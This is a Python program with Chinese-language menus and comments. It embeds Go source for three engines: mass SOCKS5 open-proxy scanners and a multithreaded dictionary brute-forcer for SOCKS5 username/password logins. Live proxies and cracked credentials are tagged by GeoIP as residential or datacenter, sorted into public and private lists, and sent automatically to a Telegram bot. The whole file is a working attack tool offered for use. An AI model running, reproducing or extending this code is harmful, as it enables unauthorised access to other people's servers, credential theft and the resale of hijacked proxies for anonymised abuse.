import subprocess
import sys
import tempfile
import os
import shutil
import hashlib
import json
import time
from datetime import datetime, timedelta
import threading
import socket
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- 依赖库检查 ---
def check_dependencies():
    missing = []
    try: from tqdm import tqdm
    except ImportError: missing.append("tqdm")
    
    try: import requests
    except ImportError: missing.append("requests")
        
    try: import geoip2.database
    except ImportError: missing.append("geoip2")

    try: import socks
    except ImportError: missing.append("pysocks")

    if missing:
        print(f"错误: 缺少以下依赖库: {', '.join(missing)}")
        print(f"请运行: pip install {' '.join(missing)}")
        sys.exit(1)

check_dependencies()
from tqdm import tqdm
import requests
import geoip2.database

# ==========================================
# GO 核心代码区 (保持高性能扫描)
# ==========================================

# 1. 协议验证器
GO_SOURCE_CODE_PROTOCOL_VERIFIER = r'''
package main
import ("bufio";"flag";"fmt";"net";"os";"strings";"sync";"sync/atomic";"time")
func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	for target := range jobs {
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			conn.Write([]byte{0x05, 0x01, 0x00})
			resp := make([]byte, 2)
			n, _ := conn.Read(resp)
			conn.Close()
			if n == 2 && resp[0] == 0x05 && resp[1] == 0x00 { fmt.Printf("S|%s\n", target) }
		}
		localCount++
		if localCount >= 20 { atomic.AddUint64(counter, 20); fmt.Println("P"); localCount = 0 }
	}
	if localCount > 0 { atomic.AddUint64(counter, uint64(localCount)); fmt.Println("P") }
}
func main() {
	inputFile := flag.String("inputFile", "", "Input File")
	threads := flag.Int("threads", 500, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()
	file, err := os.Open(*inputFile); if err != nil { return }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	jobs := make(chan string, *threads*2); var wg sync.WaitGroup; var count uint64
	for i := 0; i < *threads; i++ { wg.Add(1); go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count) }
	go func() {
		for scanner.Scan() { t := strings.TrimSpace(scanner.Text()); if t != "" { jobs <- t } }
		close(jobs)
	}()
	wg.Wait()
}
'''

# 2. 深度连通性验证器 (Microsoft)
GO_SOURCE_CODE_DEEP_VERIFIER = r'''
package main
import ("bufio";"encoding/binary";"flag";"fmt";"net";"os";"strings";"sync";"sync/atomic";"time")
func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	for target := range jobs {
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			conn.Write([]byte{0x05, 0x01, 0x00})
			resp := make([]byte, 2)
			n, _ := conn.Read(resp)
			if n == 2 && resp[0] == 0x05 && resp[1] == 0x00 {
				destHost := "www.microsoft.com"; destPort := 80
				req := []byte{0x05, 0x01, 0x00, 0x03}
				req = append(req, byte(len(destHost))); req = append(req, destHost...)
				portBytes := make([]byte, 2); binary.BigEndian.PutUint16(portBytes, uint16(destPort))
				req = append(req, portBytes...); conn.Write(req)
				reply := make([]byte, 10); n2, _ := conn.Read(reply)
				if n2 >= 4 && reply[1] == 0x00 { fmt.Printf("S|%s\n", target) }
			}
			conn.Close()
		}
		localCount++
		if localCount >= 10 { atomic.AddUint64(counter, 10); fmt.Println("P"); localCount = 0 }
	}
	if localCount > 0 { atomic.AddUint64(counter, uint64(localCount)); fmt.Println("P") }
}
func main() {
	inputFile := flag.String("inputFile", "", "Input")
	threads := flag.Int("threads", 200, "Threads")
	timeout := flag.Int("timeout", 10, "Timeout")
	flag.Parse()
	file, err := os.Open(*inputFile); if err != nil { return }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	jobs := make(chan string, *threads*2); var wg sync.WaitGroup; var count uint64
	for i := 0; i < *threads; i++ { wg.Add(1); go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count) }
	go func() {
		for scanner.Scan() { t := strings.TrimSpace(scanner.Text()); if t != "" { jobs <- t } }
		close(jobs)
	}()
	wg.Wait()
}
'''

# 3. 认证扫描器
GO_SOURCE_CODE_SCANNER = r'''
package main
import ("flag";"fmt";"net";"os";"strings";"sync";"sync/atomic";"time")
type Job struct { Host string; Port string; User string; Pass string }
func worker(jobs <-chan Job, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	for j := range jobs {
		target := net.JoinHostPort(j.Host, j.Port)
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			conn.Write([]byte{0x05, 0x02, 0x00, 0x02})
			reply := make([]byte, 2); n, _ := conn.Read(reply)
			if n > 1 {
				if reply[1] == 0x00 {
					fmt.Printf("S|%s|%s||OPEN\n", j.Host, j.Port)
				} else if reply[1] == 0x02 && j.User != "" {
					authReq := []byte{0x01}
					authReq = append(authReq, byte(len(j.User))); authReq = append(authReq, j.User...)
					authReq = append(authReq, byte(len(j.Pass))); authReq = append(authReq, j.Pass...)
					conn.Write(authReq)
					authResp := make([]byte, 2); n2, _ := conn.Read(authResp)
					if n2 > 1 && authResp[0] == 0x01 && authResp[1] == 0x00 {
						fmt.Printf("S|%s|%s|%s|%s\n", j.Host, j.Port, j.User, j.Pass)
					}
				}
			}
			conn.Close()
		}
		localCount++
		if localCount >= 50 { atomic.AddUint64(counter, 50); fmt.Println("P"); localCount = 0 }
	}
	if localCount > 0 { atomic.AddUint64(counter, uint64(localCount)); fmt.Println("P") }
}
func main() {
	proxyFile := flag.String("proxyFile", "", "Proxy File")
	dictFile := flag.String("dictFile", "", "Dict File")
	threads := flag.Int("threads", 500, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()
	pData, err := os.ReadFile(*proxyFile); if err != nil { return }
	pLines := strings.Split(string(pData), "\n")
	var proxies []string; for _, l := range pLines { if t := strings.TrimSpace(l); t != "" { proxies = append(proxies, t) } }
	dData, err := os.ReadFile(*dictFile); if err != nil { return }
	dLines := strings.Split(string(dData), "\n")
	jobs := make(chan Job, *threads*2); var wg sync.WaitGroup; var count uint64
	for i := 0; i < *threads; i++ { wg.Add(1); go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count) }
	go func() {
		for _, proxy := range proxies {
			parts := strings.Split(proxy, ":")
			if len(parts) != 2 { continue }
			for _, credLine := range dLines {
				cl := strings.TrimSpace(credLine); if cl == "" { continue }
				cParts := strings.SplitN(cl, ":", 2)
				if len(cParts) == 2 { jobs <- Job{Host: parts[0], Port: parts[1], User: cParts[0], Pass: cParts[1]} }
			}
		}
		close(jobs)
	}()
	wg.Wait()
}
'''

# ==========================================
# GeoIP & 工具模块
# ==========================================
class GeoIPManager:
    def __init__(self, db_dir="geoip_db"):
        self.db_dir = db_dir
        self.asn_db = os.path.join(db_dir, "GeoLite2-ASN.mmdb")
        self.city_db = os.path.join(db_dir, "GeoLite2-City.mmdb")
        self.readers = {}
        self.residential_keywords = ["cable", "dsl", "fiber", "residential", "home", "telecom", "broadband"]
        self.datacenter_keywords = ["cloud", "hosting", "vps", "server", "data", "center", "network"]

    def _download_file(self, url, dest_path):
        print(f"正在下载: {os.path.basename(dest_path)} ...")
        try:
            with requests.get(url, stream=True, timeout=20) as r:
                r.raise_for_status()
                with open(dest_path, 'wb') as f, tqdm(total=int(r.headers.get('content-length', 0)), unit='B', unit_scale=True) as bar:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk); bar.update(len(chunk))
            return True
        except: return False

    def ensure_databases(self):
        os.makedirs(self.db_dir, exist_ok=True)
        required = [("GeoLite2-ASN.mmdb", self.asn_db), ("GeoLite2-City.mmdb", self.city_db)]
        missing = [p for n, p in required if not os.path.exists(p)]
        if not missing: return self._init_readers()
        
        base_url = "https://github.com/mojolabs-id/GeoLite2-Database/releases/download"
        dates = [datetime.now().strftime("%Y.%m.%d"), (datetime.now()-timedelta(days=1)).strftime("%Y.%m.%d")]
        
        print(f"\n[GeoIP] 正在更新数据库...")
        for name, path in required:
            if os.path.exists(path): continue
            for d in dates:
                if self._download_file(f"{base_url}/{d}/{name}", path): break
        return self._init_readers()

    def _init_readers(self):
        try:
            if os.path.exists(self.asn_db): self.readers['asn'] = geoip2.database.Reader(self.asn_db)
            if os.path.exists(self.city_db): self.readers['city'] = geoip2.database.Reader(self.city_db)
            return True
        except: return False

    def lookup(self, ip):
        if not self.readers: return ""
        cn, city, asn, is_broad, typ = "未知", "", "未知ISP", False, "普通"
        
        if 'city' in self.readers:
            try:
                r = self.readers['city'].city(ip)
                cn = r.country.names.get('zh-CN', r.country.name)
                city = r.city.names.get('zh-CN', r.city.name) or ""
                if r.registered_country.iso_code and r.country.iso_code:
                    if r.registered_country.iso_code != r.country.iso_code: is_broad = True
            except: pass
        
        if 'asn' in self.readers:
            try:
                r = self.readers['asn'].asn(ip)
                asn = r.autonomous_system_organization or "Unknown"
                alo = asn.lower()
                if any(k in alo for k in self.residential_keywords): typ = "住宅IP"
                elif any(k in alo for k in self.datacenter_keywords): typ = "数据中心"
            except: pass
            
        clean_asn = re.sub(r'[^a-zA-Z0-9_\-]', '_', asn)[:20]
        tags = []
        if typ != "普通": tags.append(typ)
        if is_broad: tags.append("广播IP")
        t_str = f"[{']['.join(tags)}]" if tags else ""
        return f"{cn} {city} {clean_asn} {t_str}".strip()

    def close(self):
        for r in self.readers.values(): r.close()

# ==========================================
# 真链接测试模块 (Python Requests)
# ==========================================
def verify_single_proxy(proxy_str):
    """
    使用 Python requests 实际测试代理是否能访问网页。
    proxy_str 格式: socks5://user:pass@ip:port 或 socks5://ip:port
    """
    target_url = "http://www.microsoft.com"
    proxies = {'http': proxy_str, 'https': proxy_str}
    try:
        # 设置较短的超时，避免卡住，5秒足够判断死活
        resp = requests.get(target_url, proxies=proxies, timeout=6, allow_redirects=True)
        # 只要状态码是 200-399 之间都算成功
        if 200 <= resp.status_code < 400:
            return True
    except:
        pass
    return False

def batch_verify_proxies(proxy_list, max_workers=50):
    """多线程批量验证代理"""
    valid_proxies = []
    print(f"\n[二次验证] 正在对 {len(proxy_list)} 个候选代理进行真链接测试 (Timeout=6s)...")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 提交任务
        future_to_proxy = {executor.submit(verify_single_proxy, p): p for p in proxy_list}
        
        # 进度条
        with tqdm(total=len(proxy_list), unit="个", desc="验证进度") as pbar:
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    is_working = future.result()
                    if is_working:
                        valid_proxies.append(proxy)
                except: pass
                pbar.update(1)
    
    print(f"[验证完成] 存活: {len(valid_proxies)} / 原始: {len(proxy_list)}")
    return valid_proxies

# ==========================================
# 主逻辑区
# ==========================================
COMPILED_BINARIES = {}
CACHE_DIR = ".socks5_toolkit_cache"
CONFIG_FILE = "config.json"

def load_config():
    if not os.path.exists(CONFIG_FILE): return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(config, f, indent=4)

def handle_config_menu(config):
    while True:
        print("\n--- 设置菜单 ---")
        print(f"  [1] Bot Token:         {'*' * 10 if config.get('bot_token') else '未设置'}")
        print(f"  [2] Chat ID:           {config.get('chat_id') or '未设置'}")
        print(f"  [3] 自定义标识名:    {config.get('custom_id_key') or 'VPS'}")
        print(f"  [4] 自定义标识值:    {config.get('custom_id_value') or '未设置'}")
        print("\n  [b] 返回主菜单")
        c = input("选择: ").lower()
        if c == '1': config['bot_token'] = input("Bot Token: ")
        elif c == '2': config['chat_id'] = input("Chat ID: ")
        elif c == '3': config['custom_id_key'] = input("标识名: ")
        elif c == '4': config['custom_id_value'] = input("标识值: ")
        elif c == 'b': break
        save_config(config)

def get_go_path():
    path = shutil.which("go")
    if path: return path
    for p in ["/usr/local/go/bin/go", "C:\\Go\\bin\\go.exe"]:
        if os.path.exists(p): return p
    return None

def compile_go_binaries():
    go_exec = get_go_path()
    if not go_exec: print("错误: 未找到 Go 环境"); return False
    os.makedirs(CACHE_DIR, exist_ok=True)
    sources = {"protocol_verifier": GO_SOURCE_CODE_PROTOCOL_VERIFIER, "deep_verifier": GO_SOURCE_CODE_DEEP_VERIFIER, "scanner": GO_SOURCE_CODE_SCANNER}
    build_env = os.environ.copy()
    temp_base = tempfile.gettempdir()
    if 'HOME' not in build_env: build_env['HOME'] = temp_base
    build_env['GOCACHE'] = os.path.join(temp_base, 'go_build_cache')
    os.makedirs(build_env['GOCACHE'], exist_ok=True)

    print("正在检查核心组件...")
    for name, code in sources.items():
        out_path = os.path.join(CACHE_DIR, name + (".exe" if sys.platform=="win32" else ""))
        hash_path = os.path.join(CACHE_DIR, name + ".hash")
        cur_hash = hashlib.sha256(code.encode()).hexdigest()
        if not (os.path.exists(out_path) and os.path.exists(hash_path) and open(hash_path).read() == cur_hash):
            print(f"  - 编译 {name}...")
            src_path = os.path.join(CACHE_DIR, name + ".go")
            with open(src_path, "w", encoding="utf-8") as f: f.write(code)
            if subprocess.run([go_exec, "build", "-ldflags", "-s -w", "-o", out_path, src_path], capture_output=True, env=build_env).returncode != 0: return False
            with open(hash_path, 'w') as f: f.write(cur_hash)
        COMPILED_BINARIES[name] = out_path
    return True

def run_go_process(bin_name, args, total_tasks, raw_output_file):
    bin_path = COMPILED_BINARIES.get(bin_name)
    if not bin_path: return
    print(f"\n启动扫描引擎 | 任务量: {total_tasks}")
    try:
        proc = subprocess.Popen([bin_path] + args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='replace', bufsize=1)
        with tqdm(total=total_tasks, unit="chk", dynamic_ncols=True, mininterval=0.5) as pbar, open(raw_output_file, 'w', encoding='utf-8') as f:
            while True:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None: break
                if not line: continue
                line = line.strip()
                if line == "P": pbar.update(20 if "protocol" in bin_name else 10)
                elif line.startswith("S|"):
                    f.write(line + "\n"); f.flush()
                    tqdm.write(f"  [+] 发现: {line.split('|')[1]}")
    except Exception as e: print(f"错误: {e}")

def finalize_results(raw_file, output_dir, file_prefix, geoip_mgr):
    if not os.path.exists(raw_file): return []
    
    timestamp = datetime.now().strftime("%Y%m%d-%H%M")
    public_file = os.path.join(output_dir, f"{file_prefix}_Public_{timestamp}.txt")
    private_file = os.path.join(output_dir, f"{file_prefix}_Private_{timestamp}.txt")
    
    # 1. 解析原始数据
    candidates = set()
    ip_stats = {} # 用于检测泛解析
    
    with open(raw_file, 'r', encoding='utf-8') as f:
        for line in f:
            if not line.startswith("S|"): continue
            parts = line.strip().split("|")
            
            # 构建标准 socks5 字符串用于测试
            proxy_str = ""
            is_open = False
            
            if len(parts) == 2: # S|IP:Port (Protocol/Deep)
                proxy_str = f"socks5://{parts[1]}"
                is_open = True
            elif len(parts) >= 5: # Auth Scan
                if parts[4] == "OPEN":
                    proxy_str = f"socks5://{parts[1]}:{parts[2]}"
                    is_open = True
                else:
                    proxy_str = f"socks5://{parts[3]}:{parts[4]}@{parts[1]}:{parts[2]}"
            
            if proxy_str:
                candidates.add(proxy_str)
                # 统计同一IP出现的次数
                ip = parts[1].split(":")[0] if ":" in parts[1] else parts[1]
                if ip not in ip_stats: ip_stats[ip] = {"count": 0, "has_open": False}
                ip_stats[ip]["count"] += 1
                if is_open: ip_stats[ip]["has_open"] = True

    if not candidates: print("[-] 未发现候选代理。"); return []

    # 2. 执行真链接测试 (Python Requests)
    alive_proxies = batch_verify_proxies(list(candidates))
    if not alive_proxies: print("[-] 所有候选代理均无法访问网页。"); return []

    # 3. GeoIP 标记与分类
    public_lines = []
    private_lines = []
    
    print("\n正在进行 GeoIP 标记与分类...")
    for p in alive_proxies:
        # 解析IP进行GeoIP查询
        # p format: socks5://user:pass@ip:port or socks5://ip:port
        try:
            if "@" in p:
                ip_port = p.split("@")[1]
            else:
                ip_port = p.split("//")[1]
            ip = ip_port.split(":")[0]
            
            # 泛解析过滤逻辑: 如果有Open记录，或者是泛解析，则强制归类为Public且去除密码
            # 但这里我们只处理活下来的。如果一个IP有几十个密码都活了，我们只留一个无密码的(如果能用)或者留一个有密码的
            
            geo_info = geoip_mgr.lookup(ip)
            final_line = f"{p}#{geo_info}"
            
            # 分类
            # 如果该IP被标记为 has_open，或者在结果里没有 @，则是公共
            if "@" not in p:
                public_lines.append(final_line)
            else:
                # 检查泛解析: 如果该IP在原始统计中出现超过3次且没有Open记录，可能也是垃圾IP，但在Private里保留
                # 如果该IP有Open记录，但当前这条是有密码的，理论上应该已经被去重逻辑处理，但为了保险：
                if ip_stats.get(ip, {}).get("has_open", False):
                    # 既然有Open的能用，为什么还要用有密码的？
                    # 只有当Open的那个测试失败了，才保留有密码的。
                    # 这里简单处理：有密码就放Private
                    private_lines.append(final_line)
                else:
                    private_lines.append(final_line)
        except: pass

    generated_files = []
    
    # 写入文件
    if public_lines:
        public_lines = sorted(list(set(public_lines)))
        with open(public_file, 'w', encoding='utf-8') as f: f.write("\n".join(public_lines))
        print(f"[OK] 公共代理: {len(public_lines)} -> {public_file}")
        generated_files.append(public_file)
        
    if private_lines:
        private_lines = sorted(list(set(private_lines)))
        with open(private_file, 'w', encoding='utf-8') as f: f.write("\n".join(private_lines))
        print(f"[OK] 私密代理: {len(private_lines)} -> {private_file}")
        generated_files.append(private_file)
        
    return generated_files

def auto_send_telegram(config, files):
    if not config.get("bot_token") or not config.get("chat_id") or not files: return
    print("\n正在自动推送结果到 Telegram...")
    
    url = f"https://api.telegram.org/bot{config['bot_token']}/sendDocument"
    id_tag = f"{config.get('custom_id_key','VPS')}: {config.get('custom_id_value','')}"
    
    for f_path in files:
        try:
            count = sum(1 for line in open(f_path, 'r', encoding='utf-8') if line.strip())
            caption = f"{id_tag}\n类型: {os.path.basename(f_path)}\n存活数量: {count}"
            with open(f_path, 'rb') as f:
                requests.post(url, files={'document': f}, data={'chat_id': config['chat_id'], 'caption': caption})
            print(f"  -> 已发送: {os.path.basename(f_path)}")
        except Exception as e:
            print(f"  -> 发送失败 {os.path.basename(f_path)}: {e}")

# --- 主入口 ---
def main():
    if not compile_go_binaries(): sys.exit(1)
    geoip = GeoIPManager()
    geoip.ensure_databases()
    config = load_config()
    out_dir = f"Session_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(out_dir, exist_ok=True)
    
    print("\n" + "="*50)
    print(" SOCKS5 自动化扫描工具 (Auto Telegram + Real Check)")
    print("="*50)

    try:
        while True:
            print("\n[1] 协议验证 (快速)")
            print("[2] 连通验证 (微软)")
            print("[3] 混合扫描 (自动去重+真链接测试)")
            print("[4] 设置")
            print("[q] 退出")
            c = input("\n选择: ").lower()
            
            files = []
            if c == '1':
                f = input("输入文件: "); t = input("并发(800): ") or "800"
                if os.path.exists(f):
                    raw = os.path.join(out_dir, "raw.txt")
                    run_go_process("protocol_verifier", ["-inputFile", f, "-threads", t], sum(1 for x in open(f)), raw)
                    files = finalize_results(raw, out_dir, "Protocol", geoip)
            elif c == '2':
                f = input("输入文件: "); t = input("并发(800): ") or "800"
                if os.path.exists(f):
                    raw = os.path.join(out_dir, "raw.txt")
                    run_go_process("deep_verifier", ["-inputFile", f, "-threads", t], sum(1 for x in open(f)), raw)
                    files = finalize_results(raw, out_dir, "Deep", geoip)
            elif c == '3':
                print("[1] 组合 (U+P)  [2] 同名 (U=P)  [3] 经典 (U:P)")
                m = input("模式: ")
                tdir = tempfile.mkdtemp(); dfile = os.path.join(tdir, "d.txt")
                try:
                    if m=='1':
                        u=open(input("User: ")).read().splitlines(); p=open(input("Pass: ")).read().splitlines()
                        with open(dfile,'w') as f: 
                            for x in u: 
                                for y in p: f.write(f"{x}:{y}\n")
                    elif m=='2':
                        w=open(input("Dict: ")).read().splitlines()
                        with open(dfile,'w') as f: 
                            for x in w: f.write(f"{x}:{x}\n")
                    elif m=='3': shutil.copy(input("Dict: "), dfile)
                    else: continue
                    
                    pf = input("Proxy File: "); th = input("Threads(1000): ") or "1000"
                    raw = os.path.join(tdir, "raw.txt")
                    cnt = sum(1 for x in open(pf)) * sum(1 for x in open(dfile))
                    run_go_process("scanner", ["-proxyFile", pf, "-dictFile", dfile, "-threads", th], cnt, raw)
                    files = finalize_results(raw, out_dir, "Smart", geoip)
                except Exception as e: print(e)
                finally: shutil.rmtree(tdir)
            elif c == '4': handle_config_menu(config)
            elif c == 'q': break
            
            if files: auto_send_telegram(config, files)
            
    finally: geoip.close()

if __name__ == "__main__": main()
